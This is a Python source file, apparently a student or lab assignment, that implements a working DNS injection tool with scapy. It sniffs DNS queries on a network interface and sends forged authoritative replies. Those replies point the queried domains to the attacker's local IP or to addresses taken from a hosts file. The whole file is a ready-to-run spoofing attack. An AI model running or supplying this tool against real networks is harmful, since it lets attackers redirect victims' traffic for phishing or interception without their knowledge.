import argparse
from scapy.all import *
import sys
import os

global hostfile
global expression
global interface
global localIP

#cite: https://null-byte.wonderhowto.com/how-to/build-dns-packet-sniffer-with-scapy-and-python-0163601/
def dnsinject(pkt):
	global hostfile
	global expression
	global interface
	global localIP

	if IP in pkt:

		#getting default interface if -i flag not given
		#cite: https://unix.stackexchange.com/questions/14961/how-to-find-out-which-interface-am-i-using-for-connecting-to-the-internet
		if not interface:
			interface = os.popen("route | grep '^default' | grep -o '[^ ]*$'").read().split()[0]
			print "Default Interface: ",interface
			print


		#getting the local IP
		#cite: https://stackoverflow.com/questions/24196932/how-can-i-get-the-ip-address-of-eth0-in-python
		import netifaces as ni
		localIP = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']

		ip_src = pkt[IP].src
		ip_dst = pkt[IP].dst
		if pkt.haslayer(DNSQR) and pkt.getlayer(DNS).qr == 0 and pkt[DNS].qd.qtype == 1:
			domain = pkt.getlayer(DNS).qd.qname.rstrip('.')
			#check if www in domain
			if not "www" in domain:
				domain = "www." + domain

			print "---------------Sniffed packet----------------"
			print str(ip_src) + " -> " + str(ip_dst) + " : " + domain
			hostList = list()

			#check if hostfile entered
			hflag = 0
			flag = 0
			if hostfile:
				hflag = 1
				file = open(hostfile, "r")
				for line in file.readlines():
					hostList.append(line.split())

				#check if the incoming packet has src ip == ip in hostname
				for item in hostList:
					if item[1] == domain:
						flag = 1
						spoofedIP = item[0]
						break

				#if domain not in hostlist
				if flag == 0:
					print domain, " not in hosts file"
					return
			if hflag == 0:
				spoofedIP = localIP
				print "Host file not entered, spoof with local IP: ", spoofedIP

			#now spoof
			#cite: https://thepacketgeek.com/scapy-p-09-scapy-and-dns/
			#cite: values from: https://www.ietf.org/rfc/rfc1035.txt
			answer = (IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id = pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr = 1, an = DNSRR(rrname = pkt[DNS].qd.qname, ttl = 10, rdata = spoofedIP)))
			send(answer)
			print(answer[DNS].summary())
			print



def argumentParsing():
	parser = argparse.ArgumentParser(add_help = False, description = "dnsinject [-i interface] [-h hostnames] expression")
	parser.add_argument("-i", metavar="interface")
	parser.add_argument("-h", metavar="hostfile")
	parser.add_argument('expression', nargs='*',action="store")
	args = parser.parse_args()
	return args.i, args.h, args.expression

if __name__ == '__main__':
	global hostfile
	global expression
	global interface

	interface, hostfile, expression = argumentParsing()

	if interface:
		print interface
		iflag = 1

	else:
		print "No interface specified"
		iflag = 0

	if hostfile:
		print hostfile
		hflag = 1

	if expression:
		print expression

	if iflag == 1:
		sniff(iface = interface, filter = "udp port 53", prn = dnsinject, store = 0)
	else:
		sniff(filter = "udp port 53", prn = dnsinject, store = 0)
